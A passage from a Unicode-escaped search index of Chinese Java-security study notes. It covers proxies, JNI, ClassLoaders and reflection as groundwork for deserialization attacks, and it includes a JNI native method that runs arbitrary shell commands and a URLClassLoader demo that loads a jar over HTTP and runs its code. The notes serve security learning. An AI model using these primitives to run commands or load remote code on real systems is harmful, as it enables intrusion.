\u6211\u4eec\u60f3\u5728\u4e0d\u6539\u52a8hello\u7c7b\u7684\u524d\u63d0\u4e0b\uff0c\u5728\u8f93\u51fahelloworld\u65f6\u540c\u65f6\u8f93\u51fa\u5f53\u524d\u65f6\u95f4\u5230\u6587\u4ef6\uff0c\u8fbe\u5230\u65e5\u5fd7\u7684\u529f\u80fd\uff0c\u8be5\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u4ee5\u8fd9\u4e2a\u95ee\u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5f00\u59cb\u5b66\u4e60\u4ee3\u7406\u3002","title":"java \u4ee3\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_2","text":"\u9759\u6001\u4ee3\u7406\u5f88\u7b80\u5355\uff0c\u4e0d\u7528\u63a5\u89e6\u4ec0\u4e48\u65b0\u6280\u672f\u3002\u5c31\u662f\u521b\u5efa\u4e00\u4e2a\u201d\u7ee7\u627f\u5df2\u6709\u7684\u4e00\u4e2a\u7c7b \u201c\u7684\u7c7b\uff0c\u901a\u8fc7\u91cd\u5199\u7236\u7c7b\u7684\u65b9\u6cd5\uff0c\u8fbe\u5230\u4e0d\u6539\u52a8\u539f\u6709\u7c7b\u7684\u57fa\u7840\u4e0a\u589e\u6dfb\u65b0\u529f\u80fd\u3002\u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45\uff0c\u7528\u4ee3\u7801\u6765\u8bf4\u660e\u4e00\u4e0b\u5427\u3002 \u4ee5\u521a\u521a\u7684\u8f93\u51fahelloworld\u7684\u7c7b\u4e3a\u4f8b\u3002\u6211\u4eec\u7f16\u5199\u4e00\u4e2a\u5b83\u7684\u5b50\u7c7b\uff0c\u5e76\u5728\u5176\u4e2d\u91cd\u5199\u5176gogo\u65b9\u6cd5\uff0c\u6dfb\u52a0\u65e5\u5fd7\u751f\u6210\u529f\u80fd class hello{ public void gogo(){System.out.println(\"Hello Wrold\");} } class static_hello_proxy extends hello{ hello hello_obj; static_hello_proxy(hello hello){ this.hello_obj = hello; } @Override public void gogo(){ log(); hello_obj.gogo(); } public void log(){ Date date = new Date(); String value = \"date:\"+date+\"\\n\"; FileWriter writer = null; try { writer = new FileWriter(new File(\"log.txt\"),true); writer.write(value); writer.flush(); } catch (IOException e) { e.printStackTrace(); } } } \u7136\u540e\u4e3b\u51fd\u6570\u4e2d\u6211\u4eec\u53ea\u9700\u8c03\u7528static_hello_proxy\u4e2d\u7684gogo()\u65b9\u6cd5\u5c31\u80fd\u8fbe\u5230\u65e5\u5fd7\u529f\u80fd\u4e86\u3002\u8fd9\u5c31\u662f\u9759\u6001\u4ee3\u7406\u3002 \u9759\u6001\u4ee3\u7406\u7684\u7f3a\u70b9\u663e\u800c\u6613\u89c1\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4ee3\u7406\u4e0d\u540c\u7684\u7c7b\uff0c\u5c31\u8981\u5199\u51fa\u4e0d\u540c\u7684\u9759\u6001\u4ee3\u7406\u7c7b\u51fa\u6765\uff0c\u540c\u65f6\u6211\u4eec\u4e5f\u53ef\u80fd\u4f1a\u9047\u5230\u9700\u8981\u591a\u4e2a\u4ee3\u7406\u7c7b\u6765\u589e\u6dfb\u5b9e\u73b0\u4e00\u4e2a\u7c7b\u7684\u4e0d\u540c\u529f\u80fd\uff0c\u6709\u9700\u8981\u5b9a\u4e49\u4e00\u5927\u5806\u7c7b\u51fa\u6765\u3002\u4e0d\u5bb9\u6613\u7ef4\u62a4\uff0c\u6240\u4ee5\u52a8\u6001\u4ee3\u7406\u5c31\u8bde\u751f\u4e86\uff0c\u5b83\u5f88\u597d\u7684\u89e3\u51b3\u4e86\u9759\u6001\u4ee3\u7406\u4f1a\u4ea7\u751f\u5927\u91cf\u4ee3\u7406\u7c7b\u7684\u96be\u9898\u3002","title":"\u9759\u6001\u4ee3\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_3","text":"\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\uff0c\u53ef\u4ee5\u4e0d\u7528\u521b\u5efa\u4ee3\u7406\u7c7b\uff0c\u975e\u5e38\u7684\u65b9\u4fbf\u3002 \u52a8\u6001\u4ee3\u7406\u7531Proxy.newProxyInstance\u65b9\u6cd5\u5b9e\u73b0\u3002 \u6211\u4eec\u770b\u770b\u5b83\u7684\u4e09\u4e2a\u53c2\u6570\u3002 loader\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u88ab\u4ee3\u7406\u7c7b\u7684\u7c7b\u52a0\u8f7d\u5668\u3002 interfaces \u88ab\u4ee3\u7406\u7c7b\u6240\u9700\u8981\u5b9e\u73b0\u7684\u63a5\u53e3\uff0c\u53ef\u901a\u8fc7 \u7c7b\u5bf9\u8c61.getinterfaces()\u83b7\u5f97 h \u5373 InvocationHandler\u63a5\u53e3\u7c7b \u7684\u5b9e\u73b0\u7c7b\uff0c\u7528\u4e8e\u5b9e\u73b0\u4ee3\u7406\u589e\u6dfb\u7684\u65b9\u6cd5 \u6211\u4eec\u770b\u770b\u8fd9\u4e2a InvocationHandler \u7c7b\u7684\u7ed3\u6784\u3002\u8fd9\u4e2a\u7c7b\u53ea\u6709\u4e00\u4e2ainvoke\u65b9\u6cd5\uff0c\u4e14\u8fd9\u4e2a\u7c7b\u662f\u63a5\u53e3\u7c7b\u3002\u8fd9\u4e2ainvoke\u65b9\u6cd5\u5c31\u7528\u4e8e\u5b58\u653e\u6211\u4eec\u7684\u589e\u6dfb\u7684\u529f\u80fd\u3002 proxy\u5373\u4ee3\u7406\u5bf9\u8c61\uff0cmethod\u5373\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\uff0cargs\u5373\u65b9\u6cd5\u4e2d\u7684\u53c2\u6570\u3002 ok\uff0c\u63a5\u4e0b\u6765\u628a\u521a\u521a\u90a3\u4e2a\u7c7b\u52a8\u6001\u4ee3\u7406\u4e00\u4e0b\u5427\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u52a8\u6001\u4ee3\u7406\u53ea\u80fd\u4ee3\u7406\u63a5\u53e3\u5b9e\u73b0\u7c7b\u3002 import java.io.File; import java.io.FileInputStream; import java.io.FileWriter; import java.io.IOException; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; import java.util.Date; public class test { public static void main(String[] args){ hello hello_obj = new hello(); ClassLoader Loader = hello_obj.getClass().getClassLoader(); Class<?>[] Interfaces = hello_obj.getClass().getInterfaces(); InvocationHandler ih = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if(method.getName()==\"gogo\"){ FileWriter writer = new FileWriter(\"log.txt\"); writer.write(\"date:\"+new Date()+\"|by \u52a8\u6001\u4ee3\u7406\\n\"); writer.flush(); hello_obj.gogo(); } return null; } }; hello_interface proxy = (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih); //\u6ce8\u610f\u8fd9\u91cc\u6570\u636e\u7c7b\u578b\u662f\u63a5\u53e3\u7684\u6570\u636e\u7c7b\u578b proxy.gogo(); } } interface hello_interface{ public void gogo(); } class hello implements hello_interface{ public void gogo(){System.out.println(\"Hello Wrold\");} } OK,ALL DOWN","title":"\u52a8\u6001\u4ee3\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jni","text":"JNI\u662fJAVA\u7684\u4e00\u4e2a\u63a5\u53e3\uff0c\u7528\u6765\u5b9e\u73b0c/c++\u8c03\u7528\uff0c\u4e3aJAVA\u63d0\u4f9b\u4e86\u4e00\u4e2a\u64cd\u7eb5\u5e95\u5c42\u7684\u80fd\u529b\u3002","title":"JNI"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jni-helloworld","text":"java IDE\uff1aidea C IDE\uff1avs2019 1.\u5199\u597dJAVA\u6587\u4ef6\uff0c\u5b9a\u4e49\u597dnative\u65b9\u6cd5\u3002 public class test { static{ System.loadLibrary(\"Dll1\"); } public native void hello(); public static void main(String[] args) { test a = new test(); a.hello(); } } 2.\u4f7f\u7528javac\u6307\u4ee4\u4e3ajava\u6587\u4ef6\u7684\u5404native\u65b9\u6cd5\u751f\u6210c\u8bed\u8a00\u5934\u6587\u4ef6\u3002 javac -cp . test.java -h . \u6267\u884c\u540e\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a\u5934\u6587\u4ef6 3.\u7528vscode\u521b\u5efa\u4e00\u4e2adll\u9879\u76ee\uff0c\u5c06test.h\u4e0ejdk include\u76ee\u5f55\u4e0b\u7684jni.h\u4ee5\u53cajdk/include/win32/jni_md.h\u7edf\u7edf\u79fb\u52a8\u5230\u9879\u76ee\u6587\u4ef6\u76ee\u5f55\u4e0b\u3002\u7136\u540e\u5728vscode\u5934\u6587\u4ef6\u91cc\u6dfb\u52a0\u73b0\u6709\u9879\uff0c\u628a\u521a\u521a\u653e\u5230\u9879\u76ee\u6587\u4ef6\u4e0b\u76843\u4e2a\u5934\u6587\u4ef6\u6dfb\u52a0\u8fdb\u53bb\u3002 4.\u5728c\u6216c++\u4e2d\u5b9a\u4e49native\u65b9\u6cd5\u7684c/c++\u539f\u578b\u3002 \u901a\u8fc7test.h\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u54ea\u4e9b\u65b9\u6cd5\u9700\u8981\u6211\u4eec\u5b9a\u4e49\u3002\u8fd9\u91cc\u662fJava_test_hello\u65b9\u6cd5\u3002 \u6211\u4eec\u968f\u4fbf\u5b9a\u4e49\u4e00\u4e0b #include \"test.h\" JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) { printf(\"Hello,World\"); } \u7f16\u8bd1\u4e3adll\u6587\u4ef6\u3002 5.\u5728idea\u91cc\u4e3a\u5f53\u524d\u9879\u76ee\u6307\u5b9a\u4f9d\u8d56dll\u6587\u4ef6\u8def\u5f84 \u5148\u70b9\u51fb\u7bad\u5934\u6307\u5411\u5904\u7684\u7f16\u8f91\u9009\u9879\uff0c\u7136\u540e\u5728\u865a\u62df\u673a\u9009\u9879\u91cc\u586b\u4e0a-Djava.library.path=\u4f60\u7684dll\u8def\u5f84 6.\u628adll\u6587\u4ef6\u62d6\u8fdb\u521a\u521a\u914d\u7f6e\u597d\u7684\u4f9d\u8d56\u8def\u5f84\uff0c\u8fd0\u884c","title":"JNI HelloWorld"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jni_1","text":"JNI\u7c7b\u578b\u6570\u636e\u5728c\u6587\u4ef6\u91cc\u5f53\u4f5c\u4f20\u5165\u53c2\u6570\u548c\u8fd4\u56de\u7ed3\u679c\uff0c\u53c2\u6570\u4f20\u5165\u540e\u5176\u6570\u636e\u7c7b\u578b\u4f1a\u88ab\u7528\u6307\u5b9a\u65b9\u6cd5\u8f6c\u6362\u4e3aC\u7c7b\u578b\u7136\u540e\u88ab\u5904\u7406\uff0c\u5904\u7406\u5b8c\u6bd5\u540e\u4f7f\u7528\u6307\u5b9a\u65b9\u6cd5\u8f6c\u6362\u4e3aJNI\u7c7b\u578b\u8fd4\u56de\u7ed9JAVA\u3002 \u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e0bc\u4e2dJNI\u7c7b\u578b\u4e0ec\u7c7b\u578b\u4e92\u8f6c\u7684\u51fd\u6570 jstring\u8f6cchar*\uff1aenv->GetStringUTFChars(str, &jsCopy) char*\u8f6cjstring: env->NewStringUTF(\"Hello...\") \u5b57\u7b26\u4e32\u8d44\u6e90\u91ca\u653e: env->ReleaseStringUTFChars(javaString, p);","title":"JNI \u6570\u636e\u7c7b\u578b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#jni_2","text":"\u76f8\u5f53\u4e8e\u4e00\u4e2a\u52a0\u5f3a\u7248\u7684helloworld. \u9996\u5148\u6211\u4eec\u770b\u4e00\u4e0b\uff0c\u5982\u679c\u5728c++\u4e2d\u6211\u4eec\u60f3\u6267\u884c\u672c\u5730\u547d\u4ee4\u6267\u884c\u8be5\u5982\u4f55\u6267\u884c #include<iostream> #include<stdio.h> #include <string> std::string gogo(const char* cmd) { const char* cmd = cmd; FILE* fp = _popen(cmd, \"r\"); if (fp != NULL) { std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fp) != NULL) { result += buf; } return result; } } int main() { std::string result = gogo(\"dir\"); std::cout << result; } \u90a3\u4e48\u6211\u4eec\u5728JNI\u91cc\u5982\u4f55\u5b9e\u73b0\u5462?\u5176\u5b9e\u4e5f\u5dee\u4e0d\u591a. \u6211\u4eec\u73b0\u5728\u5199\u597djava\u4ee3\u7801 public class test { static{ System.loadLibrary(\"Dll2\"); } public native String gogo(String cmd); public static void main(String[] args) { test a = new test(); String str = a.gogo(\"dir\"); System.out.println(str); } } \u5199\u597dc++\u4ee3\u7801 #include \"test.h\" #include<iostream> #include<stdio.h> #include <string> JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) { const char* cmd = env->GetStringUTFChars(str, 0); FILE* fd = _popen(cmd, \"r\"); if (fd != NULL) { std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fd) != NULL) { result += buf; } _pclose(fd); return env->NewStringUTF(result.c_str()); } } \u8fd0\u884c\u7ed3\u679c","title":"JNI \u5b9e\u73b0\u672c\u5730\u547d\u4ee4\u6267\u884c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_4","text":"","title":"\u7c7b\u52a0\u8f7d\u5668"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#classloader","text":"\u5728JVM\u7c7b\u52a0\u8f7d\u5668\u4e2d\u6700\u9876\u5c42\u7684\u662f Bootstrap ClassLoader(\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668) \u3001 Extension ClassLoader(\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668) \u3001 App ClassLoader(\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668) \uff0c AppClassLoader \u662f\u9ed8\u8ba4\u7684\u7c7b\u52a0\u8f7d\u5668\uff0c\u5982\u679c\u7c7b\u52a0\u8f7d\u65f6\u6211\u4eec\u4e0d\u6307\u5b9a\u7c7b\u52a0\u8f7d\u5668\u7684\u60c5\u51b5\u4e0b\uff0c\u9ed8\u8ba4\u4f1a\u4f7f\u7528 AppClassLoader \u52a0\u8f7d\u7c7b\uff0c ClassLoader.getSystemClassLoader() \u8fd4\u56de\u7684\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668\u4e5f\u662f AppClassLoader \u3002 ClassLoader\u7684\u4e3b\u8981\u65b9\u6cd5\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff1a loadClass (\u52a0\u8f7d\u6307\u5b9a\u7684Java\u7c7b) findClass (\u67e5\u627e\u6307\u5b9a\u7684Java\u7c7b) findLoadedClass (\u67e5\u627eJVM\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u7684\u7c7b) defineClass (\u4ecebyte[]\u83b7\u5f97\u4e00\u4e2aJava\u7c7b) resolveClass (\u94fe\u63a5\u6307\u5b9a\u7684Java\u7c7b) \u5982\u4f55\u901a\u8fc7ClassLoader\u83b7\u53d6\u4e00\u4e2a\u7c7b\u5bf9\u8c61\uff1f\u5f88\u7b80\u5355 Class a = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\"); \u5b83\u5bf9\u4e00\u4e2a\u7c7b\u7684\u52a0\u8f7d\u6d41\u7a0b\u5982\u4e0b: ClassLoader\u8c03\u7528loadClass(String name)\u65b9\u6cd5\u52a0\u8f7d\u6307\u5b9a\u7c7b \u8c03\u7528findLoadedClass\u68c0\u67e5\u6307\u5b9a\u7684\u7c7b\u662f\u5426\u5df2\u7ecf\u521d\u59cb\u5316\uff0c\u82e5\u5df2\u521d\u59cb\u5316\u5219\u76f4\u63a5\u8fd4\u56de\u7c7b\u5bf9\u8c61 \u5982\u679c\u521b\u5efaClassLoader\u65f6\u4f20\u5165\u7236\u7c7b\u52a0\u8f7d\u5668\uff0c\u5219\u4f7f\u7528\u7236\u7c7b\u52a0\u8f7d\u5668\u52a0\u8f7d\u6307\u5b9a\u7c7b\uff0c\u5426\u5219\u4f7f\u7528JVM\u7684Bootstrap ClassLoader\uff08\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668\uff09\u52a0\u8f7d \u5982\u679c\u4ee5\u4e0a\u6b65\u9aa4\u6ca1\u6709\u5b8c\u6210\u52a0\u8f7d\uff0c\u5219\u4f7f\u7528findClass\u65b9\u6cd5\u5c1d\u8bd5\u52a0\u8f7d\u6307\u5b9a\u7c7b \u5982\u679c\u5f53\u524dClassLoader\u7c7b\u6ca1\u6709\u91cd\u5199findClass\u65b9\u6cd5\u5219\u76f4\u63a5\u8fd4\u56de\u5f02\u5e38\u3002\u82e5\u91cd\u5199\u4e86\u8be5\u65b9\u6cd5\u4e14\u901a\u8fc7findClass\u627e\u5230\u4e86\u4f20\u5165\u7684\u7c7b\u540d\u7684\u5bf9\u5e94\u7684\u7c7b\u5b57\u8282\u7801\uff0c\u90a3\u4e48\u5c31\u4f1a\u4f7f\u7528defineClass\u53bbJVM\u6ce8\u518c\u8be5\u7c7b \u5982\u679cloadClass\u8c03\u7528\u65f6\u4f20\u5165resolve\u7684\u53c2\u6570\u4e3atrue\uff0c\u5219\u90a3\u4e48\u8fd8\u9700\u8981\u8c03\u7528resolveClass\u65b9\u6cd5\u8fde\u63a5\u7c7b\u3002\u8be5\u53c2\u6570\u9ed8\u8ba4\u4e3afalse \u8fd4\u56de\u88abJVM\u52a0\u8f7d\u540e\u7684\u6307\u5b9a\u7c7b\u7684\u7c7b\u5bf9\u8c61","title":"ClassLoader"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#classloader_1","text":"java.lang.ClassLoader \u662f\u6240\u6709\u7c7b\u52a0\u8f7d\u5668\u7684\u7236\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u91cd\u5199\u5176findClass\u65b9\u6cd5\u6765\u5b9e\u73b0\u81ea\u5b9a\u4e49ClassLoader\u3002 \u6211\u4eec\u8bd5\u7740\u81ea\u5b9a\u4e49\u4e00\u4e2a\uff0c\u5f53\u5bf9loadClass\u4f20\u5165com.anbai.sec.classloader.TestHelloWorld \u65f6\u4f1a\u76f4\u63a5\u8fd4\u56de\u4e00\u4e2a\u5728\u52a0\u8f7d\u5668\u91cc\u5df2\u7ecf\u5b9a\u4e49\u597d\u4e86\u7684\u5bf9\u5e94\u7c7b\u7684\u7c7b\u5bf9\u8c61\u3002 class TestClassLoader extends ClassLoader{ String testClassName=\"com.anbai.sec.classloader.TestHelloWorld\"; byte[] testClassBytes = new byte[]{-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12}; //\u8fd9\u90e8\u5206\u662f\u7c7b\u5b57\u8282\u7801\uff0c\u662f\u6211\u4ece\u522b\u4eba\u90a3\u91cc\u5ad6\u7684 @Override protected Class<?> findClass(String name) throws ClassNotFoundException { if(name.equals(\"com.anbai.sec.classloader.TestHelloWorld\")){ return defineClass(testClassName,testClassBytes,0,testClassBytes.length); } else{ return super.findClass(name); } } } \u7136\u540e\u4e3b\u51fd\u6570\u6211\u4eec\u5199 public static void main(String[] args) { try { TestClassLoader Loader = new TestClassLoader(); Class clazz = Loader.loadClass(\"com.anbai.sec.classloader.TestHelloWorld\"); Object Instance = clazz.newInstance(); Method method = Instance.getClass().getMethod(\"hello\"); String str = (String) method.invoke(Instance); System.out.println(str); }catch (Exception e){} } \u7ecf\u6d4b\u8bd5\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c\u3002\u6211\u4eec\u7684\u81ea\u5b9a\u4e49ClassLoader\u5c31\u5199\u597d\u4e86\u3002\u5f53\u7136\u8fd8\u6709\u66f4\u591a\u82b1\u91cc\u80e1\u54e8\u7684\u91cd\u5199\u65b9\u6cd5\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u662f\u77e5\u9053\u600e\u4e48\u91cd\u5199\u5373\u53ef\u3002","title":"ClassLoader\u81ea\u5b9a\u4e49"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#urlclassloader","text":"URLClassLoader\u4e5f\u662fClassLoader\u7c7b\u4e0b\u7684\u4e00\u4e2a\u91cd\u5199\u7c7b\u3002\u8fd9\u4e2a\u7c7b\u5f88\u597d\u7528\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u534f\u8bae\u83b7\u53d6\u8fdc\u7a0b\u7684jar\u5305\uff0c\u7136\u540e\u901a\u8fc7\u7c7b\u52a0\u8f7d\u5668\u53bb\u83b7\u5f97\u5176\u4e2d\u7684\u6307\u5b9a\u7c7b\u7684\u7c7b\u5bf9\u8c61\u3002\u8bd5\u8bd5\u5427\u3002 \u6d41\u7a0b\u662f\u5148\u5b9a\u4e49\u4e00\u4e2aURL\u5bf9\u8c61\u6307\u5411\u6211\u4eec\u7684jar\u5305\uff0c\u7136\u540e\u5b9e\u4f8b\u5316\u4e00\u4e2aURLClassLoader\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7loadClass\u52a0\u8f7d\u67d0\u4e2a\u7c7b\u83b7\u5f97\u7c7b\u5bf9\u8c61\u3002 import java.lang.reflect.Field; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; public class test { public static void main(String[] args){ try{ // Class clazz = ClassLoader.getSystemClassLoader().loadClass(\"fuck\"); // Method method = clazz.getMethod(\"func1\",int.class); // method.invoke(clazz.newInstance(),123); URL url = new URL(\"http://127.0.0.1/LOL.jar\"); URLClassLoader Loader = new URLClassLoader(new URL[]{url}); Class clazz = Loader.loadClass(\"fuck\"); Method method = clazz.getMethod(\"func1\",int.class); method.setAccessible(true); method.invoke(clazz.newInstance(),123); } catch (Exception e){ e.printStackTrace(); } } } \u7136\u540e\u6211\u4eecjar\u5305\u91cc\u7684class\u662f\u8fd9\u4e2a.JAVA\u7684\u7f16\u8bd1\u6587\u4ef6 public class fuck{ public void func1(int input1){ System.out.print(input1); } } \u6267\u884c\u7ed3\u679c","title":"URLClassLoader"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_5","text":"","title":"\u53cd\u5c04"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/#_6","text":"\u53cd\u5c04\u662fjava\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u7528\u4e8e\u83b7\u53d6\u7c7b\u7684\u8be6\u7ec6\u4fe1\u606f\uff08\u65b9\u6cd5\uff0c\u53d8\u91cf\uff09\uff0c\u5e76\u53ef\u4ee5\u6267\u884